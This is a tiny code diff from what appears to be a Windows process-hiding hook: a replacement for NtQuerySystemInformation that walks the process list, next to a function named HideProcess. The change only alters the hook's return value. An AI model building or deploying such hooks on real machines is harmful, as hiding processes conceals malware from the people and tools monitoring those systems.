@@ -55,7 +55,7 @@ FNtQuerySystemInformation(
 			procInfo = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)procInfo + procInfo->NextEntryOffset);
 		}
 	}
-	return(1);
+	return(nret);
 }
 
 int HideProcess()
